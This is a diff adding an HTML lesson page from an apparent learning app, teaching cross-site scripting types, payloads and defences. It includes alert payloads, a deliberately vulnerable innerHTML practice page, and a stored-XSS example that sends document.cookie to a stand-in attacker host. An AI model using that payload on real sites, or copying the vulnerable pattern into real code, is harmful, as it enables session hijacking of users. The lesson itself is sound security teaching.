@@ -1,0 +1,644 @@
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Learn | DevTracker</title>
+
+<link rel="stylesheet" href="css/main.css">
+<link rel="stylesheet" href="css/learning.css">
+<link rel="stylesheet" href="css/animation.css">
+<link rel="stylesheet" href="css/auth.css">
+<link rel="stylesheet" href="css/loading.css">
+<link rel="stylesheet"
+	href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css">
+<style>
+.more-videos-card {
+	margin-top: 32px;
+	padding: 28px;
+	text-align: center;
+	border: 1px dashed var(--border);
+	border-radius: 18px;
+	background: linear-gradient(135deg, #fafafa, #ffffff);
+}
+
+.more-videos-card h3 {
+	margin-bottom: 8px;
+}
+
+.more-videos-card .btn {
+	margin-top: 18px;
+	display: inline-flex;
+}
+
+
+</style>
+</head>
+
+<body>
+
+	<!-- Mobile top bar -->
+	<div class="mobile-topbar">
+		<a class="mobile-logo" href="dashboard.jsp"> <i
+			class="ti ti-route"></i> DevTracker
+		</a>
+	</div>
+
+	<div class="layout">
+
+		<!-- Sidebar -->
+		<aside class="sidebar" id="sidebar">
+
+			<div class="sidebar-logo">
+				<a class="logo-mark" href="dashboard.jsp"> <i
+					class="ti ti-route"></i>
+					<div>
+						<div>DevTracker</div>
+						<div class="logo-sub">Learning OS</div>
+					</div>
+				</a>
+			</div>
+
+			<nav class="nav">
+				<div class="nav-section-label">Menu</div>
+
+				<a class="nav-item" href="dashboard.jsp"> <i
+					class="ti ti-layout-dashboard"></i> Dashboard
+				</a> <a class="nav-item" href="create-roadmap.jsp"> <i
+					class="ti ti-plus"></i> Create Roadmap
+				</a>
+				
+				<a class="nav-item" href="openAIRoadmap?id=14"> <i
+					class="ti ti-books"></i> Syllabus
+				</a> <a class="nav-item" href="schedule.jsp?roadmapId=14">
+					<i class="ti ti-calendar-week"></i> Daily Tasks
+				</a> <a class="nav-item active" href=""> <i class="ti ti-notes"></i>
+					Notes
+				</a>
+				
+
+				<div class="nav-section-label">Manage</div>
+				<a class="nav-item" href="trash.jsp"> <i class="ti ti-recycle"></i>
+					Recover Deleted
+				</a>
+			</nav>
+
+			<div class="sidebar-footer">
+				<div class="user-row">
+					<div class="avatar">
+						<i class="ti ti-user" style="font-size: 15px"></i>
+					</div>
+					<div class="user-info">
+						<div class="user-name">My Account</div>
+						<div class="user-plan">Free plan</div>
+					</div>
+					<a href="logout" class="logout-btn" title="Logout"> <i
+						class="ti ti-logout"></i>
+					</a>
+				</div>
+			</div>
+
+		</aside>
+
+		<main class="main">
+
+			<div class="top-bar">
+
+				<div>
+					<h1>
+						📚
+						Introduction to Cross-Site Scripting (XSS) Vulnerabilities
+					</h1>
+
+					<button class="lesson-check-btn"
+						onclick="toggleLesson(
+									643,
+									true,
+									this
+								)">
+						
+						<i class="ti ti-circle"></i> Mark Complete
+						
+					</button>
+				</div>
+
+				<button class="btn" id="displayBtn" type="button"
+					aria-haspopup="dialog" aria-expanded="false"
+					onclick="toggleDisplayPanel()">
+					<!-- desktop: icon + text -->
+
+					<!-- mobile FAB: icon only (shown via CSS) -->
+					<span class="btn-icon-only" aria-hidden="true"> <i
+						class="ti ti-adjustments"></i>
+					</span> <span class="btn-label">Adjust Display</span>
+				</button>
+
+				<a class="btn btn-sm" href="openAIRoadmap?id=14"> <i
+					class="ti ti-arrow-left"></i> Back
+				</a>
+
+			</div>
+
+			<!-- Reading Mode / Display Settings popover (floats above content, fixed position) -->
+			<div id="readingModeOverlay" class="reading-mode-overlay"></div>
+
+			<div id="displayPanel" class="reading-mode-popover" role="dialog"
+				aria-label="Display settings">
+				<div class="reading-mode-handle"></div>
+
+				<div class="reading-mode-header">
+					<h3>Reading Mode</h3>
+					<button type="button" class="reading-mode-close"
+						aria-label="Close display settings" onclick="closeDisplayPanel()">
+						<i class="ti ti-x"></i>
+					</button>
+				</div>
+
+				<div class="reading-mode-slider-wrap">
+					<input type="range" min="0" max="2" step="1" value="1"
+						id="sizeSlider" oninput="changeReadingSize(this.value)"
+						aria-label="Reading mode">
+
+					<div class="reading-mode-track-labels">
+						<span data-mode="0" onclick="changeReadingSize(0)">Compact</span>
+						<span data-mode="1" onclick="changeReadingSize(1)">Comfortable</span>
+						<span data-mode="2" onclick="changeReadingSize(2)">Focus</span>
+					</div>
+				</div>
+			</div>
+
+			<div class="stats-card">
+				<div class="learning-wrapper">
+					<div class="learning-card">
+						<div class="learning-body">
+							<div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; max-width: 1000px; margin: 20px auto; padding: 20px; background-color: #f9fbfd; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05); box-sizing: border-box;">
+
+    <h1 style="color: #2c3e50; font-size: 2.2em; border-bottom: 2px solid #e0e7eb; padding-bottom: 15px; margin-bottom: 30px;">
+        Introduction to Cross-Site Scripting (XSS) Vulnerabilities
+    </h1>
+
+    <section style="background-color: #e8f5e9; padding: 20px; border-radius: 10px; margin-bottom: 25px; border-left: 5px solid #4caf50;">
+        <h2 style="color: #2e7d32; margin-top: 0; font-size: 1.6em;">📘 Introduction: Understanding XSS</h2>
+        <p>Hey there, future ethical hacker! Today, we're diving into one of the most common and dangerous web vulnerabilities out there: <strong>Cross-Site Scripting, or XSS</strong>. Think of it as tricking a website into running malicious code in *another user's browser*. It's not about attacking the server directly, but rather exploiting the trust a user has in a legitimate website to run scripts that aren't supposed to be there.</p>
+        <p>In simple terms, XSS occurs when a web application allows an attacker to inject client-side scripts (usually JavaScript) into web pages viewed by other users. When an unsuspecting user visits the compromised page, their browser executes this malicious script, believing it's part of the legitimate website.</p>
+    </section>
+
+    <section style="background-color: #e3f2fd; padding: 20px; border-radius: 10px; margin-bottom: 25px; border-left: 5px solid #2196f3;">
+        <h2 style="color: #1976d2; margin-top: 0; font-size: 1.6em;">💡 Why Learn This? Real-World Impact</h2>
+        <p>XSS isn't just a theoretical flaw; it has severe real-world consequences:</p>
+        <ul style="list-style-type: disc; margin-left: 20px;">
+            <li style="margin-bottom: 8px;"><strong>Session Hijacking:</strong> Attackers can steal session cookies, allowing them to impersonate logged-in users and take over their accounts without needing their passwords.</li>
+            <li style="margin-bottom: 8px;"><strong>Defacement:</strong> Malicious scripts can alter the content of a web page, potentially damaging a brand's reputation.</li>
+            <li style="margin-bottom: 8px;"><strong>Malware Distribution:</strong> XSS can be used to redirect users to malicious websites or even deliver drive-by downloads of malware.</li>
+            <li style="margin-bottom: 8px;"><strong>Phishing:</strong> An attacker can create convincing fake login forms within a legitimate site, tricking users into revealing their credentials.</li>
+            <li style="margin-bottom: 8px;"><strong>Data Theft:</strong> Scripts can access and exfiltrate sensitive user data, like browsing history or other information accessible to the client-side script.</li>
+        </ul>
+        <p>Understanding XSS is crucial for both offensive (finding vulnerabilities) and defensive (patching and preventing them) security roles.</p>
+    </section>
+
+    <section style="background-color: #fffde7; padding: 20px; border-radius: 10px; margin-bottom: 25px; border-left: 5px solid #ffeb3b; color: #5c5c5c;">
+        <h2 style="color: #fbc02d; margin-top: 0; font-size: 1.6em;">🧠 Core Concepts: How XSS Works & Its Types</h2>
+        <p>At its heart, XSS exploits the browser's trust in data received from the web server. If a web application doesn't properly validate, filter, or encode user-supplied input before including it in a web page, that input can contain malicious script.</p>
+
+        <h3 style="color: #f9a825; font-size: 1.3em; margin-top: 20px;">The Three Main Types of XSS:</h3>
+        <ol style="list-style-type: decimal; margin-left: 20px;">
+            <li style="margin-bottom: 10px;">
+                <strong>Reflected XSS (Non-Persistent):</strong>
+                <p>This is the most common type. The malicious script is "reflected" off the web server to the user's browser. It typically occurs when user input is immediately returned by a web application in an error message, search result, or any other response without proper sanitization. The attacker usually crafts a malicious URL containing the payload and sends it to a victim. The attack requires the victim to click the malicious link.</p>
+            </li>
+            <li style="margin-bottom: 10px;">
+                <strong>Stored XSS (Persistent):</strong>
+                <p>This is generally considered the most dangerous type. The malicious script is permanently stored on the target server (e.g., in a database, message forum, comment field, visitor log). When victims visit the web page that retrieves and displays this stored data, their browsers execute the script. This affects all users who view the compromised page, without needing them to click a special link.</p>
+            </li>
+            <li style="margin-bottom: 10px;">
+                <strong>DOM-based XSS:</strong>
+                <p>This type of XSS occurs entirely within the client-side code (JavaScript) without the payload ever reaching the server. The vulnerability exists in the way a client-side script writes user-supplied data to the Document Object Model (DOM). For example, if a JavaScript reads a value from the URL (like <code>window.location.hash</code>) and insecurely writes it into the HTML, an attacker can manipulate the URL to inject malicious code.</p>
+            </li>
+        </ol>
+    </section>
+
+    <section style="background-color: #f7f9fc; padding: 20px; border-radius: 10px; margin-bottom: 25px; border-left: 5px solid #607d8b;">
+        <h2 style="color: #455a64; margin-top: 0; font-size: 1.6em;">👀 Visual Explanation: How XSS Works</h2>
+        <p>Let's visualize a simplified Reflected XSS attack flow:</p>
+        <pre style="background-color: #eceff1; color: #37474f; padding: 15px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap; margin-bottom: 20px; border: 1px solid #cfd8dc;"><code>
+1. Attacker crafts malicious URL:
+   https://example.com/search?query=&lt;script&gt;alert('XSS!');&lt;/script&gt;
+
+2. Attacker sends URL to Victim.
+   (e.g., via email, chat)
+         |
+         v
+
+3. Victim clicks URL.
+   Victim's Browser ----&gt; Request to example.com with malicious query
+         |
+         v
+
+4. Web Server receives request:
+   (Insecure application doesn't sanitize input)
+   &lt;html&gt;
+     &lt;body&gt;
+       You searched for: &lt;script&gt;alert('XSS!');&lt;/script&gt; &lt;-- Injected!
+     &lt;/body&gt;
+   &lt;/html&gt;
+         |
+         v
+
+5. Web Server responds with crafted HTML.
+   &lt;--- Response to Victim's Browser
+
+6. Victim's Browser executes script:
+   Browser parses HTML, finds &lt;script&gt; tag, and executes it.
+   &lt;script&gt;alert('XSS!');&lt;/script&gt; runs in Victim's context.
+
+   Result: Pop-up "XSS!" appears on Victim's screen (or worse!).
+        </code></pre>
+        <p>For Stored XSS, step 4 would involve the attacker saving the script to the database, and then any subsequent request by a victim to the page that displays this data would trigger the script.</p>
+    </section>
+
+    <section style="background-color: #f3e5f5; padding: 20px; border-radius: 10px; margin-bottom: 25px; border-left: 5px solid #9c27b0;">
+        <h2 style="color: #7b1fa2; margin-top: 0; font-size: 1.6em;">💻 Examples: Seeing XSS in Action</h2>
+        <p>Let's look at how an XSS payload might look in practice. Remember, the goal here is to show injection, not full exploitation.</p>
+
+        <h3 style="color: #6a1b9a; font-size: 1.3em; margin-top: 20px;">Example 1: Reflected XSS (Simple Alert)</h3>
+        <p>Imagine a search feature where the search term is displayed on the page. If the application doesn't encode the output, you could input:</p>
+        <pre style="background-color: #e1bee7; color: #4a148c; padding: 15px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap;"><code>
+&lt;script&gt;alert('You are XSSed!');&lt;/script&gt;
+        </code></pre>
+        <p>If the page's HTML output looks something like this:</p>
+        <pre style="background-color: #e1bee7; color: #4a148c; padding: 15px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap;"><code>
+&lt;p&gt;Your search for: &lt;script&gt;alert('You are XSSed!');&lt;/script&gt; was not found.&lt;/p&gt;
+        </code></pre>
+        <p>Your browser will execute the <code>alert()</code> function!</p>
+
+        <h3 style="color: #6a1b9a; font-size: 1.3em; margin-top: 20px;">Example 2: Stored XSS (Cookie Theft)</h3>
+        <p>Consider a comment section where users can post comments. An attacker posts a comment like this:</p>
+        <pre style="background-color: #e1bee7; color: #4a148c; padding: 15px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap;"><code>
+&lt;script&gt;new Image().src="http://attacker.com/steal?cookie="+document.cookie;&lt;/script&gt;
+        </code></pre>
+        <p>When this comment is saved to the database and later displayed to other users, their browsers will execute this script. It attempts to send their session cookies to the attacker's server (<code>attacker.com</code>).</p>
+        <div style="background-color: #ffedb3; border: 1px solid #ffc107; padding: 10px; border-radius: 8px; margin-top: 15px;">
+            <strong style="color: #d32f2f;">Important:</strong> Always use an isolated, safe environment (like a local test server or a dedicated lab) when experimenting with XSS. Never test on live websites without explicit permission!
+        </div>
+    </section>
+
+    <section style="background-color: #ffebee; padding: 20px; border-radius: 10px; margin-bottom: 25px; border-left: 5px solid #f44336;">
+        <h2 style="color: #d32f2f; margin-top: 0; font-size: 1.6em;">⚠️ Common Mistakes & Developer Flaws</h2>
+        <p>XSS vulnerabilities often arise from a few common mistakes by developers:</p>
+        <ul style="list-style-type: disc; margin-left: 20px;">
+            <li style="margin-bottom: 8px;"><strong>Lack of Input Sanitization:</strong> Not cleaning or validating user input before it's processed or stored.</li>
+            <li style="margin-bottom: 8px;"><strong>Insufficient Output Encoding:</strong> Displaying user-supplied data directly on a web page without properly converting characters like <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>"</code>, <code>'</code> into their HTML entities (e.g., <code>&amp;lt;</code>, <code>&amp;gt;</code>). This is the #1 defense against XSS.</li>
+            <li style="margin-bottom: 8px;"><strong>Over-reliance on Client-Side Validation:</strong> Believing that if client-side JavaScript validates input, it's safe. Attackers can easily bypass client-side validation. All validation must happen on the server-side.</li>
+            <li style="margin-bottom: 8px;"><strong>Using Unsafe JavaScript Functions:</strong> Functions like <code>innerHTML</code>, <code>document.write()</code>, or <code>eval()</code> can be dangerous if used with user-controlled input without proper sanitization.</li>
+        </ul>
+    </section>
+
+    <section style="background-color: #e0f2f7; padding: 20px; border-radius: 10px; margin-bottom: 25px; border-left: 5px solid #00bcd4;">
+        <h2 style="color: #00838f; margin-top: 0; font-size: 1.6em;">📝 Practice: Identifying Basic XSS</h2>
+        <p>To get a feel for XSS, try these simple exercises in a safe, controlled environment (like a local web server you set up or a dedicated CTF/lab platform):</p>
+
+        <h3 style="color: #006064; font-size: 1.3em; margin-top: 20px;">Easy: Reflected XSS in a Search Bar</h3>
+        <p>Create a simple HTML page with a search input field and a script that reflects the input back onto the page. For example:</p>
+        <pre style="background-color: #b2ebf2; color: #004d40; padding: 15px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap;"><code>
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;XSS Practice&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Simple Search&lt;/h1&gt;
+    &lt;form action="index.html" method="GET"&gt;
+        &lt;input type="text" name="query" placeholder="Search..."&gt;
+        &lt;button type="submit"&gt;Search&lt;/button&gt;
+    &lt;/form&gt;
+    &lt;div id="results"&gt;&lt;/div&gt;
+
+    &lt;script&gt;
+        const urlParams = new URLSearchParams(window.location.search);
+        const query = urlParams.get('query');
+        if (query) {
+            // THE VULNERABLE PART: Directly inserting user input
+            document.getElementById('results').innerHTML = '&lt;p&gt;You searched for: ' + query + '&lt;/p&gt;';
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+        </code></pre>
+        <p>Now, try to inject <code>&lt;script&gt;alert('XSS!');&lt;/script&gt;</code> into the search bar. What happens?</p>
+
+        <h3 style="color: #006064; font-size: 1.3em; margin-top: 20px;">Medium: Stored XSS in a Comment Section</h3>
+        <p>Imagine a very basic guestbook or comment section where user input is saved and displayed. If the input is not sanitized when stored or when displayed, it's vulnerable to Stored XSS. This would typically involve a server-side script and a database, which is beyond this introductory lesson's scope, but the concept remains: inject a script into the comment field, and see if it executes for other "users" (i.e., when you refresh the page or open it in another browser).</p>
+        <p><strong>Goal:</strong> Successfully execute a JavaScript alert or embed an image from a third-party site using XSS in one of these simple scenarios.</p>
+    </section>
+
+    <section style="background-color: #e1f5fe; padding: 20px; border-radius: 10px; margin-bottom: 25px; border-left: 5px solid #03a9f4;">
+        <h2 style="color: #0288d1; margin-top: 0; font-size: 1.6em;">🎯 Exam / Interview Preparation</h2>
+        <p>For ethical hacking internships or security interviews, be prepared to answer:</p>
+        <ul style="list-style-type: disc; margin-left: 20px;">
+            <li style="margin-bottom: 8px;">"What is XSS and why is it dangerous?"</li>
+            <li style="margin-bottom: 8px;">"Differentiate between Reflected, Stored, and DOM-based XSS."</li>
+            <li style="margin-bottom: 8px;">"How would you prevent XSS vulnerabilities in a web application?" (Key answer: Output encoding and input validation).</li>
+            <li style="margin-bottom: 8px;">"Give an example of an XSS payload."</li>
+        </ul>
+    </section>
+
+    <section style="background-color: #f3f3f3; padding: 20px; border-radius: 10px; border-left: 5px solid #6c757d;">
+        <h2 style="color: #495057; margin-top: 0; font-size: 1.6em;">⚡ Quick Revision: XSS Essentials</h2>
+        <ul style="list-style-type: '⚡ '; padding-left: 20px;">
+            <li style="margin-bottom: 8px;"><strong>XSS (Cross-Site Scripting):</strong> Attacker injects client-side script into a web page viewed by other users.</li>
+            <li style="margin-bottom: 8px;"><strong>Impact:</strong> Session hijacking, data theft, defacement, phishing.</li>
+            <li style="margin-bottom: 8px;"><strong>Types:</strong>
+                <ul style="list-style-type: circle; margin-left: 20px;">
+                    <li><strong>Reflected:</strong> Payload in URL, reflected by server, executed by victim. Not persistent.</li>
+                    <li><strong>Stored:</strong> Payload saved on server, served to all victims. Persistent.</li>
+                    <li><strong>DOM-based:</strong> Client-side script manipulates DOM insecurely.</li>
+                </ul>
+            </li>
+            <li style="margin-bottom: 8px;"><strong>Defense:</strong> Crucially, <strong>Output Encoding</strong> of all user-supplied data rendered into HTML. Also, strong <strong>Input Validation</strong>.</li>
+            <li style="margin-bottom: 8px;"><strong>Key Principle:</strong> Never trust user input!</li>
+        </ul>
+    </section>
+
+</div>
+						</div>
+					</div>
+				</div>
+			</div>
+
+			<div class="stats-card">
+
+				<h2>🎬 Recommended Videos</h2>
+
+				<div class="video-grid">
+
+					
+
+					<div class="video-card">
+						<iframe src="https://www.youtube.com/embed/z4LhLJnmoZ0"
+							allowfullscreen></iframe>
+
+						<h3>Cross-Site Scripting: A 25-Year Threat That Is Still Going Strong</h3>
+
+						<p class="muted-text">IBM Technology</p>
+
+						<p>🥇 Best match</p>
+					</div>
+
+					
+
+					<div class="video-card">
+						<iframe src="https://www.youtube.com/embed/EoaDgUgS6QA"
+							allowfullscreen></iframe>
+
+						<h3>Cross-Site Scripting (XSS) Explained</h3>
+
+						<p class="muted-text">PwnFunction</p>
+
+						<p>Recommended learning resource</p>
+					</div>
+
+					
+
+					<div class="video-card">
+						<iframe src="https://www.youtube.com/embed/cWu_FJUrH5Y"
+							allowfullscreen></iframe>
+
+						<h3>What is Cross Site Scripting?| Cross Site Scripting Attack | Cross Site Scripting Tutorial | Edureka</h3>
+
+						<p class="muted-text">edureka!</p>
+
+						<p>Recommended learning resource</p>
+					</div>
+
+					
+
+					<div class="video-card">
+						<iframe src="https://www.youtube.com/embed/WkDQTivDoW0"
+							allowfullscreen></iframe>
+
+						<h3>What Is Cross Site Scripting (XSS)? | Cross Site Scripting Explained |XSS Attack | Simplilearn</h3>
+
+						<p class="muted-text">Simplilearn</p>
+
+						<p>Recommended learning resource</p>
+					</div>
+
+					
+
+					<div class="video-card">
+						<iframe src="https://www.youtube.com/embed/0GxLc2vsQVg"
+							allowfullscreen></iframe>
+
+						<h3>Elite XSS Hacking Masterclass (Official Hands-On Course)</h3>
+
+						<p class="muted-text">Tis Jesse</p>
+
+						<p>Recommended learning resource</p>
+					</div>
+
+					
+
+					<div class="video-card">
+						<iframe src="https://www.youtube.com/embed/l77LuRue_lM"
+							allowfullscreen></iframe>
+
+						<h3>What is Cross Site Scripting [XSS] | Cross Site Scripting Working Explained - Full Tutorial</h3>
+
+						<p class="muted-text">WsCube Cyber Security</p>
+
+						<p>Recommended learning resource</p>
+					</div>
+
+					
+
+					<div class="video-card">
+						<iframe src="https://www.youtube.com/embed/PzRQhpbYbeg"
+							allowfullscreen></iframe>
+
+						<h3>Website Hacking Demos using Cross-Site Scripting (XSS) - it&#39;s just too easy!</h3>
+
+						<p class="muted-text">David Bombal</p>
+
+						<p>Recommended learning resource</p>
+					</div>
+
+					
+
+					<div class="video-card">
+						<iframe src="https://www.youtube.com/embed/q_0fdnSNXsU"
+							allowfullscreen></iframe>
+
+						<h3>XSS | Cross-Site Scripting Explained | HINDI | by Animation | Enlight The Hack | For Beginners</h3>
+
+						<p class="muted-text">Enlight The Hack</p>
+
+						<p>Recommended learning resource</p>
+					</div>
+
+					
+					<div class="more-videos-card">
+
+						<h3>Want more videos?</h3>
+
+						<p class="muted-text">Browse more tutorials from YouTube based
+							on this topic.</p>
+
+						<a class="btn" href="searchVideos?subtopicId=643">
+							<i class="ti ti-brand-youtube"></i> Explore More Videos
+						</a>
+
+					</div>
+					
+
+				</div>
+			</div>
+
+		</main>
+	</div>
+
+	<!-- Bottom tab bar (mobile only) -->
+	<nav class="bottom-nav">
+
+		<a class="bn-item" href="dashboard.jsp"> <i
+			class="ti ti-layout-dashboard"></i> Dashboard
+		</a> <a class="bn-item active" href=""> <i class="ti ti-notes"></i>
+			Notes
+		</a> <a class="bn-item" href="openAIRoadmap?id=14"> <i
+			class="ti ti-books"></i> Syllabus
+		</a> <a class="bn-item " href="schedule.jsp?roadmapId=14">
+			<i class="ti ti-calendar-week"></i> Daily Tasks
+		</a>
+
+	</nav>
+
+	<script>
+/* ── keywords (your existing logic, untouched) ── */
+let rawKeywords = /*= keywordJson =*/[];   // JSP fills this: null
+
+let keywords = [];
+try {
+  keywords = Array.isArray(rawKeywords) ? rawKeywords : JSON.parse(rawKeywords);
+} catch (e) { keywords = []; }
+
+let box = document.getElementById("keywordBox");
+keywords.forEach(k => {
+  let link = document.createElement("a");
+  link.className = "keyword-chip";
+  link.innerText = k;
+  link.href = "searchVideos?subtopicId=643&query=" + encodeURIComponent(k);
+  box.appendChild(link);
+});
+
+/* ── Mark Complete AJAX (untouched) ── */
+function toggleLesson(id, completed, btn) {
+  let old = btn.innerHTML;
+  btn.innerHTML = "Saving…";
+
+  fetch("updateSubTopic", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: "id=" + id + "&completed=" + completed
+  })
+  .then(() => {
+    if (completed) {
+      btn.innerHTML = '<i class="ti ti-circle-check-filled"></i> Completed';
+    } else {
+      btn.innerHTML = '<i class="ti ti-circle"></i> Mark Complete';
+    }
+    btn.setAttribute("onclick", "toggleLesson(" + id + "," + !completed + ",this)");
+  })
+  .catch(() => { btn.innerHTML = old; });
+}
+
+/* ══════════════════════════════════════════════════
+   READING MODE / DISPLAY SETTINGS
+   localStorage key preserved from the original page
+══════════════════════════════════════════════════ */
+(function () {
+  var STORAGE_KEY = "devtracker-reading-mode";        // same key as before
+  var MODES       = ["compact", "comfortable", "focus"];
+
+  var displayBtn = document.getElementById("displayBtn");
+  var panel      = document.getElementById("displayPanel");
+  var overlay    = document.getElementById("readingModeOverlay");
+  var slider     = document.getElementById("sizeSlider");
+  var labels     = panel.querySelectorAll(".reading-mode-track-labels span");
+
+  /* ── apply a mode by index ── */
+  function applyMode(index, persist) {
+    index = Math.max(0, Math.min(2, parseInt(index, 10) || 0));
+
+    MODES.forEach(function (m) {
+      document.body.classList.remove("reading-" + m);
+    });
+    document.body.classList.add("reading-" + MODES[index]);
+
+    slider.value = index;
+
+    labels.forEach(function (l) {
+      l.classList.toggle("active",
+        parseInt(l.getAttribute("data-mode"), 10) === index);
+    });
+
+    if (persist) {
+      try { localStorage.setItem(STORAGE_KEY, MODES[index]); } catch (e) {}
+    }
+  }
+
+  /* ── open / close ── */
+  function openPanel() {
+    panel.classList.add("is-open");
+    overlay.classList.add("is-open");
+    displayBtn.setAttribute("aria-expanded", "true");
+  }
+  function closePanel() {
+    panel.classList.remove("is-open");
+    overlay.classList.remove("is-open");
+    displayBtn.setAttribute("aria-expanded", "false");
+  }
+
+  window.toggleDisplayPanel = function () {
+    panel.classList.contains("is-open") ? closePanel() : openPanel();
+  };
+  window.closeDisplayPanel  = closePanel;
+  window.changeReadingSize  = function (value) { applyMode(value, true); };
+
+  overlay.addEventListener("click", closePanel);
+  document.addEventListener("keydown", function (e) {
+    if (e.key === "Escape") closePanel();
+  });
+
+  /* ── restore saved preference ── */
+  var saved = null;
+  try { saved = localStorage.getItem(STORAGE_KEY); } catch (e) {}
+  var savedIndex = MODES.indexOf(saved);
+  applyMode(savedIndex >= 0 ? savedIndex : 1, false);  // default: Comfortable
+})();
+</script>
+	<script src="js/loading.js"></script>
+	<div id="loadingContainer"></div>
+
+	<script>
+window.addEventListener("DOMContentLoaded", async () => {
+
+    const res = await fetch("includes/loading.html");
+    const html = await res.text();
+
+    document.getElementById("loadingContainer").innerHTML = html;
+
+});
+</script>
+</body>
+</html>
